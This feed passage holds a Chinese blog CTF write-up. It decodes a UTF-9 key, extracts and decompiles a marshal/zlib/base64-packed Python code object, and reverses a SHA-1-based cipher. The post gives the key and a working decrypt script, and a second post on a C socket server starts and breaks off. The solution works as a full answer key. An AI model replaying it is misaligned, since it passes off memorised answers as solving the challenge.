      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前一阵子，为了活跃一下群里的气氛，出了一道小题涉及到一些编码，反编译，解密的知识的题目让大家玩，如果你比较感兴趣的话也可以先试着做一做。</p><h2 id="0x01-获取key"><a href="#0x01-获取key" class="headerlink" title="0x01 获取key"></a>0x01 获取key</h2><a id="more"></a><p>下载得到题目包<a href="https://github.com/sunnyelf/you_need_python_write_up/" target="_blank" rel="external">you_need_python.zip</a>，解压得到flag.py和key_is_here_but_do_you_know_rfc4042和两个文件，尝试运行flag.py：</p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/1789796538.png" alt="1.png"></p><p>要求输入key，由另一个文件名key_is_here_but_do_you_know_rfc4042，可知key需要从key_is_here_but_do_you_know_rfc4042中获得，查看key_is_here_but_do_you_know_rfc4042文件的内容：</p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/2422032094.png" alt="2.png"></p><p>文件内容是一些乱码，但是文件名提示了rfc4042，于是网上查询相关资料，知道rfc4042中定义了utf9和utf18两种Unicode转换编码格式，在了解转换原理之后，根据题意推测是将uft9编码转化了utf8编码，通过资料查询得知python已有utf9模块（如果没有查询到也可以自己动手编写转换代码），使用pip安装utf9模块：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pip search utf9  </div><div class="line">pip install utf9</div></pre></td></tr></table></figure><p></p><p>编写代码将文件内容的uft9编码转化utf8编码：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding utf-8</span></div><div class="line"><span class="comment">#utf9_to_utf8.py</span></div><div class="line"><span class="keyword">import</span> utf9</div><div class="line"></div><div class="line">utf9_file = open(<span class="string">'key_is_here_but_do_you_know_rfc4042'</span>,<span class="string">'rb'</span>)</div><div class="line">utf9_data = utf9_file.read()</div><div class="line">decoded_data = utf9.utf9decode(utf9_data)</div><div class="line"><span class="keyword">print</span> decoded_data</div><div class="line">decoded_file = open(<span class="string">'decoded'</span>,<span class="string">'w'</span>)</div><div class="line">decoded_file.write(decoded_data)</div><div class="line">decoded_file.close()</div></pre></td></tr></table></figure><p></p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/3384744252.png" alt="3.png"></p><p>得到一堆符号串，但是经常仔细观察，除了“<em>”符号外，其他符号都是Python中的算数运算符，“(”，“)”括号表示优先级，然后开脑洞“</em>”为数字“1”，“<strong>”为数字“2”，依次类推“<strong>___</strong></strong>”为数字“9”，在熟悉了utf9模块的使用后尝试编写转换代码，代码执行后得到数字：5287002131074331513，尝试转换为16进制然后转换为ASCII字符：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="comment">#key_show.py</span></div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"></div><div class="line">_ = <span class="number">1</span></div><div class="line">__ = <span class="number">2</span></div><div class="line">___ = <span class="number">3</span></div><div class="line">____ = <span class="number">4</span></div><div class="line">_____ = <span class="number">5</span></div><div class="line">______ = <span class="number">6</span></div><div class="line">_______ = <span class="number">7</span></div><div class="line">________ = <span class="number">8</span></div><div class="line">_________ = <span class="number">9</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> binascii.a2b_hex(hex(eval(<span class="string">"_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)*__+_)**_________+_______*(((_________%_______)*__+_______-(________//________))**_______)+(________/__)*(((____-_+_______)*(______+____))**___)+___*((__+_________-_)**_____)+___*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))**__)+(_//_)*(((________%___%__+_____+_____)%______)+_______-_)**___+_____*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___"</span>))[<span class="number">2</span>:][:<span class="number">-1</span>])</div></pre></td></tr></table></figure><p></p><p>运行得到key。</p><h2 id="0x02-分析flag-py"><a href="#0x02-分析flag-py" class="headerlink" title="0x02 分析flag.py"></a>0x02 分析flag.py</h2><p><img src="https://www.hackfun.org/usr/uploads/2017/03/2696293271.png" alt="4.png"></p><p>查询有关marshal, zlib, base64模块和exec函数的资料，反向推测源代码或字节码先是使用marshal模块序列化，之后使用zlib压缩，最后使用base64编码，而exec语句可以用来执行储存在字符串或者文件中的python语句或python字节码。所以尝试提取exec语句执行的内容：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> marshal, zlib, base64</div><div class="line">code = marshal.loads(zlib.decompress(base64.b64decode(<span class="string">'eJxtVP9r21YQvyd/ieWm66Cd03QM1B8C3pggUuzYCSWstHSFQijyoJBhhGq9OXJl2ZFeqAMOK6Q/94f9Ofvn1s+d7Lgtk/3O997du/vc584a0eqpYP2GVfwDEeOrKCU6g2LRRyiK4oooFsVVUSqkqxTX6J1F+SfSNYrrdKPorC76luhbpOEGCZNFZw2KG3Rmk26QtuXi3xTb7ND6/aVu0g2RuvhEcZNut5lAGbTvAFbyH57TkYLKy8J6xpDvQxiiiaIlcdqJxVcHbXY6bXNlZgviPCrO0+StqfKd88gzNh/qRZyMdWHE29TZZvIkG7eZFRGGRcBmsXJaUoKCQ9fWKHwSqNeKFnsM5PnwJ7q2aKk4AFhcWtQCh+ChB5+Lu/RmyYUxmtOEYxas7i/2iuR7Ti14OEOSmU0RADd4+dQzbM1FJhukAUeQ+kZROuLyioagrau76kc1slY1NNaY/y3LAxDQBrAICJisV2hMdF2lxQcyFuMoqcX3+TCl6xotqzSpkqmxYVmjXVjAXiwBsEfBrd1VvTvLCj2EXRnhoryAKdpxcIgJcowUB68yAx/tlCAuPHqDuZo0CN3CUGHwkPhGMA7aXMfphjbmQLhLhJcHa0a+mpgB191c1U1lnHJQbgkHx+WGxeJbejnpkzSavo2jkxZ7i725npGAaTc8FXmUjbUETHUmkxXN5zqL5WiWxwE7Bc11yyYzNJpN02jerq+DzNNodfxOX8kE4FcmYKscDdYD1oPGGucXYNmgs1F+NTf3GOt3Mg7b+NTVruqoQyX1hOEUacKw+AGbP38ZOq9THRXaSbL5pXGQ8bho/Z/lrzQaHxdoCrlev+t6nZ7re57r+57rHXag93Deh37k+vuw9zorO/Qj/B50cAf2oyOsvut3D+ADWxdxfN/1Drqu39mHzvcRswv/Hvz7sHeg9w8Qzy99DzuFwxhPhs6zWTbOI3OZRiaZZcVj5wVwOklx7OwVxR47PR46r/SVM8ulBJic9zku/eqY/MqJxiDj+Gd55wS3f35pbLCzHoEwzKKpDkN5i+TR+1AYCWTo5IV0Z0P9H3phDDd6lMzPdS5bbo9eJGbTsW9nbDqLL1N9Iq+rRxDbll2x67a9Lf27hw5uK1s1rZr6DOPF+FI='</span>)))  </div><div class="line"><span class="keyword">print</span> <span class="string">"type of code:%s"</span> %type(code)</div></pre></td></tr></table></figure><p></p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/918721047.png" alt="5.png"></p><p>得知code类型为Python代码对象（PyCodeObject），为了便于题目讲解，以下简单阐述个人对Python解释器运行原理，pyc文件格式以及Python代码对象的理解。</p><p>当你使用命令python demo.py（这里的python其实是python解释器中的CPython）时 ，会启动 Python解释器，Python解释器首先会检查当前目录是否存在相应的demo.pyc或demo.pyo文件（pyo文件是经过Python解释器编译优化，然后将内存中的字节码对象序列化并加上pyo文件头信息的可储存的二进制文件），如果都存在优先检查运行demo.pyo，如果不存在相应的demo.pyc或demo.pyo那么Python解释器就会编译demo.py，因为Python解释器检查运行pyc文件和pyo文件两者过程类似，下面以pyc文件为例，如果存在相应的pyc文件Python解释器则验证demo.pyc文件头的前四个字节幻数（magic number）的值，以确保当前文件是pyc文件格式且当前Python解释器版本能支持，如果验证不通过则给出提示退出，如果验证通过继续检查demo.pyc文件头的后四个字节py源文件修改时间（mtime，modify time），如果demo.pyc文件头的mtime和现在demo.py源文件的修改时间一样，那么Python解释器就会把demo.pyc（不包括文件头的8个字节）加载到内存并将demo.pyc文件反序列化为代码对象交给Python虚拟机（Python虚拟机只是Python解释器中实现的一部分，为了便于理解人们把这部分抽象命名为Python虚拟机）处理执行，运行完毕Python解释器退出。如果demo.pyc文件头的mtime早于现在py源文件的修改时间，说明之前的demo.py源文件经过了修改需要重新编译。</p><p>Python解释器所做的工作就不深入了，可以简单理解为Python解释器将demo.py加载到内存编译一个对应的字节码对象，然后交由Python虚拟机程序处理执行，Python 虚拟机会从编译得到的代码对象中依次读入每一条字节码指令，并在当前的上下文环境中执行这条字节码指令。而执行完毕之后Python编译器会根据情况生成相应的pyc文件，生成过程为Python解释器将内存的Python代码对象反序列化并加上相应的py文件头信息一起写入到硬盘，所以pyc文件只是Python代码对象在硬盘上的表现形式，生成pyo文件过程也类似，只是多了Python解释器优化的过程。</p><h2 id="0x03-提取得到pyc文件"><a href="#0x03-提取得到pyc文件" class="headerlink" title="0x03 提取得到pyc文件"></a>0x03 提取得到pyc文件</h2><p>所以我们要做的便是编写代码将code这个Python代码对象加上相应pyc文件头信息提取出来写入磁盘生成pyc文件，生成pyc文件目的是便于我们反编译pyc文件得到相应的py源码。当然你也可以通过Python自带的dis模块慢慢分析pyc文件中的字节码指令。<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#coding = utf-8</span></div><div class="line"><span class="comment">#PyCodeObject_to_pyc.py</span></div><div class="line"><span class="keyword">import</span> py_compile, imp, os, marshal, zlib, base64</div><div class="line"></div><div class="line">code = marshal.loads(zlib.decompress(base64.b64decode(<span class="string">'eJxtVP9r21YQvyd/ieWm66Cd03QM1B8C3pggUuzYCSWstHSFQijyoJBhhGq9OXJl2ZFeqAMOK6Q/94f9Ofvn1s+d7Lgtk/3O997du/vc584a0eqpYP2GVfwDEeOrKCU6g2LRRyiK4oooFsVVUSqkqxTX6J1F+SfSNYrrdKPorC76luhbpOEGCZNFZw2KG3Rmk26QtuXi3xTb7ND6/aVu0g2RuvhEcZNut5lAGbTvAFbyH57TkYLKy8J6xpDvQxiiiaIlcdqJxVcHbXY6bXNlZgviPCrO0+StqfKd88gzNh/qRZyMdWHE29TZZvIkG7eZFRGGRcBmsXJaUoKCQ9fWKHwSqNeKFnsM5PnwJ7q2aKk4AFhcWtQCh+ChB5+Lu/RmyYUxmtOEYxas7i/2iuR7Ti14OEOSmU0RADd4+dQzbM1FJhukAUeQ+kZROuLyioagrau76kc1slY1NNaY/y3LAxDQBrAICJisV2hMdF2lxQcyFuMoqcX3+TCl6xotqzSpkqmxYVmjXVjAXiwBsEfBrd1VvTvLCj2EXRnhoryAKdpxcIgJcowUB68yAx/tlCAuPHqDuZo0CN3CUGHwkPhGMA7aXMfphjbmQLhLhJcHa0a+mpgB191c1U1lnHJQbgkHx+WGxeJbejnpkzSavo2jkxZ7i725npGAaTc8FXmUjbUETHUmkxXN5zqL5WiWxwE7Bc11yyYzNJpN02jerq+DzNNodfxOX8kE4FcmYKscDdYD1oPGGucXYNmgs1F+NTf3GOt3Mg7b+NTVruqoQyX1hOEUacKw+AGbP38ZOq9THRXaSbL5pXGQ8bho/Z/lrzQaHxdoCrlev+t6nZ7re57r+57rHXag93Deh37k+vuw9zorO/Qj/B50cAf2oyOsvut3D+ADWxdxfN/1Drqu39mHzvcRswv/Hvz7sHeg9w8Qzy99DzuFwxhPhs6zWTbOI3OZRiaZZcVj5wVwOklx7OwVxR47PR46r/SVM8ulBJic9zku/eqY/MqJxiDj+Gd55wS3f35pbLCzHoEwzKKpDkN5i+TR+1AYCWTo5IV0Z0P9H3phDDd6lMzPdS5bbo9eJGbTsW9nbDqLL1N9Iq+rRxDbll2x67a9Lf27hw5uK1s1rZr6DOPF+FI='</span>)))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">PyCodeObject_to_pyc</span><span class="params">(py_code_obj, pyc_file)</span>:</span></div><div class="line">    <span class="keyword">with</span> open(pyc_file, <span class="string">'wb'</span>) <span class="keyword">as</span> pyc:</div><div class="line">        pyc_magic = imp.get_magic()</div><div class="line">        pyc.write(pyc_magic)</div><div class="line">        mtime = long(os.fstat(pyc.fileno()).st_mtime)</div><div class="line">        py_compile.wr_long(pyc, mtime)</div><div class="line">        marshal.dump(py_code_obj, pyc)</div><div class="line">        pyc.flush()</div><div class="line">        pyc.close()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    PyCodeObject_to_pyc(code, <span class="string">'extract.pyc'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure><p></p><h2 id="0x04-反编译pyc文件得到py源文件"><a href="#0x04-反编译pyc文件得到py源文件" class="headerlink" title="0x04 反编译pyc文件得到py源文件"></a>0x04 反编译pyc文件得到py源文件</h2><p>将生成的pyc通过Python工具如uncompyle2等反编译得到py源码，这里直接通过在线的pyc反编译网站得到py源码：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="comment">#source.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha1</span><span class="params">(string)</span>:</span></div><div class="line">    <span class="keyword">return</span> hashlib.sha1(string).hexdigest()</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(strSHA1)</span>:</span></div><div class="line">    r = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strSHA1:</div><div class="line">        r += int(<span class="string">'0x%s'</span> % i, <span class="number">16</span>)</div><div class="line">    <span class="keyword">return</span> r</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(plain, key)</span>:</span></div><div class="line">    keySHA1 = sha1(key)</div><div class="line">    intSHA1 = calc(keySHA1)</div><div class="line">    r = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</div><div class="line">        r.append(ord(plain[i]) + int(<span class="string">'0x%s'</span> % keySHA1[i % <span class="number">40</span>], <span class="number">16</span>) - intSHA1)</div><div class="line">        intSHA1 = calc(sha1(plain[:i + <span class="number">1</span>])[:<span class="number">20</span>] + sha1(str(intSHA1))[:<span class="number">20</span>])</div><div class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(map((<span class="keyword">lambda</span> x: str(x)), r))</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    key = raw_input(<span class="string">'[*] Please input key:'</span>)</div><div class="line">    plain = raw_input(<span class="string">'[*] Please input flag:'</span>)</div><div class="line">    encryptText = encrypt(plain, key)</div><div class="line">    cipherText = <span class="string">'-185-147-211-221-164-217-188-169-205-174-211-225-191-234-148-199-198-253-175-157-222-135-240-229-201-154-178-187-244-183-212-222-164'</span></div><div class="line">    <span class="keyword">if</span> encryptText == cipherText:</div><div class="line">        <span class="keyword">print</span> <span class="string">'[&gt;] Congratulations! Flag is: %s'</span> % plain</div><div class="line">        exit()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'[!] Key or flag is wrong, try again:)'</span></div><div class="line">        exit()</div></pre></td></tr></table></figure><p></p><h2 id="0x05-分析py源文件中加密算法"><a href="#0x05-分析py源文件中加密算法" class="headerlink" title="0x05 分析py源文件中加密算法"></a>0x05 分析py源文件中加密算法</h2><p>sha1函数使用sha1算法计算返回40位16进制散列值，calc函数计算40位16进制散列值中每位的整型值并相加，最后返回整型的总和值。<br>encrypt函数为核心加密算法函数：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(plain, key)</span>:</span></div><div class="line">    keySHA1 = sha1(key)</div><div class="line">    intSHA1 = calc(keySHA1)</div><div class="line">    r = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</div><div class="line">        r.append(ord(plain[i]) + int(<span class="string">'0x%s'</span> % keySHA1[i % <span class="number">40</span>], <span class="number">16</span>) - intSHA1)</div><div class="line">        intSHA1 = calc(sha1(plain[:i + <span class="number">1</span>])[:<span class="number">20</span>] + sha1(str(intSHA1))[:<span class="number">20</span>])</div><div class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(map((<span class="keyword">lambda</span> x: str(x)), r))</div></pre></td></tr></table></figure><p></p><p>由第4行的for可以知道到明文长度和密文长度相同，核心加密语句为第6，7行，算法使用ord函数取得明文每个字符的ASCII整型值，int函数内容为明文每个字符位置模40访问由调用sha1函数返回的40位16进制keySHA1字符串中的16进制数并转化为10进制数与由调用calc函数返回的整型值相减，然后将ord函数和int计算所得值作为密文添加到r列表，第7行更新intSHA1值，第9行转换为“-185-147-211…”格式并返回。<br>这里我们知道了密文cipherText，密钥key，加密算法encrypt，从而能逆推出解密算法，只要把密文值减去int函数中的值并对结果使用chr函数取得明文plain。</p><h2 id="0x06-编写解密代码"><a href="#0x06-编写解密代码" class="headerlink" title="0x06 编写解密代码"></a>0x06 编写解密代码</h2><pre><code class="py"><span class="comment">#coding:utf-8</span>
<span class="comment">#decrypt.py</span>

<span class="keyword">import</span> hashlib

<span class="function"><span class="keyword">def</span> <span class="title">sha1</span><span class="params">(string)</span>:</span>
    <span class="keyword">return</span> hashlib.sha1(string).hexdigest()

<span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(strSHA1)</span>:</span>
    r = <span class="number">0</span>
    <span class="keyword">for</span> i <span class="keyword">in</span> strSHA1:
        r += int(<span class="string">"0x%s"</span> % i, <span class="number">16</span>)
    <span class="keyword">return</span> r

<span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(strCipher,strKey)</span>:</span>
    listCipher = map(<span class="keyword">lambda</span> x: int(x),strCipher.replace(<span class="string">'-'</span>,<span class="string">' -'</span>)[<span class="number">1</span>:].split(<span class="string">' '</span>))
    strKeySHA1 = sha1(strKey)
    intSHA1 = calc(strKeySHA1)
    strPlain = <span class="string">''</span>
    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(listCipher)):
        strPlain += chr(listCipher[i] + intSHA1 - int(<span class="string">"0x%s"</span> % strKeySHA1[i%<span class="number">40</span>],<span class="number">16</span>))
        intSHA1 = calc(sha1(strPlain[:(i + <span class="number">1</span>)])[:<span class="number">20</span>] + sha1(str(intSHA1))[:<span class="number">20</span>])
    <span class="keyword">return</span> strPlain

<span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:
    strCipher= <span class="string">'-185-147-211-221-164-217-188-169-205-174-211-225-191-234-148-199-198-253-175-157-222-135-240-229-201-154-178-187-244-183-212-222-164'</span>
    strKey = <span class="string">'zijisuan'</span>
    strPlain = decrypt(strCipher, strKey)
    <span class="keyword">print</span> strPlain
</code></pre><p>最终获得flag。</p><h2 id="0x07-后话"><a href="#0x07-后话" class="headerlink" title="0x07 后话"></a>0x07 后话</h2><p>我才不会告诉你集各路赛棍大牛的群号在博客上。</p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> python </tag>
            
            <tag> pycodeobject </tag>
            
            <tag> utf9 </tag>
            
            <tag> uncompyle2 </tag>
            
            <tag> marshal </tag>
            
            <tag> 解密 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux平台C语言Socket编程练习之线程专用数据TSD实现]]></title>
      <url>/2016/11/25/Linux%E5%B9%B3%E5%8F%B0C%E8%AF%AD%E8%A8%80Socket%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0%E4%B9%8B%E7%BA%BF%E7%A8%8B%E4%B8%93%E7%94%A8%E6%95%B0%E6%8D%AETSD%E5%AE%9E%E7%8E%B0/</url>
      <content type="html"><![CDATA[<h2 id="0x00-要求"><a href="#0x00-要求" class="headerlink" title="0x00 要求"></a>0x00 要求</h2><p>采用多线程并发服务器技术，服务器可以同时接受多个客户的请求。具体要求如下:</p><p><strong>服务端</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">接收并显示与之连接的客户端的名称；</div><div class="line"></div><div class="line">接收客户端发来的字符串，显示出来，并对字符串做反转处理，最后将处理后的字符串发回给客户；</div><div class="line"></div><div class="line">在每个用户退出时要显示该用户输入的所有信息。</div></pre></td></tr></table></figure><p><strong>客户端</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">根据客户输入的服务器IP地址，向服务器发起建立连接的请求；</div><div class="line"></div><div class="line">接收客户输入的客户端名称，并把该客户端名称发给服务器；</div><div class="line"></div><div class="line">接收客户输入的字符串，将字符串发送给服务器；</div><div class="line"></div><div class="line">接收服务器发回的反转处理后的字符串并显示。继续接受客户输入的字符串，直到用户输入quit时退出。</div></pre></td></tr></table></figure><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><a id="more"></a><p><strong>服务端</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 1234</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BACKLOG 5</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXDATASIZE 100</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_cli</span><span class="params">(<span class="keyword">int</span> connfd,struct sockaddr_in client,<span class="keyword">char</span> cli_input[])</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">function</span><span class="params">(<span class="keyword">void</span>* arg)</span></span>;</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ARG</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">    <span class="keyword">int</span> connfd;</div><div class="line">    <span class="keyword">char</span> cli_input[<span class="number">1000</span>];</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client</span>;</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> listenfd;</div><div class="line">    <span class="keyword">int</span> connfd;</div><div class="line">    <span class="keyword">pthread_t</span> tid;</div><div class="line">    <span class="keyword">socklen_t</span> client_len;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ARG</span> *<span class="title">arg</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client</span>;</span></div><div class="line"></div><div class="line">  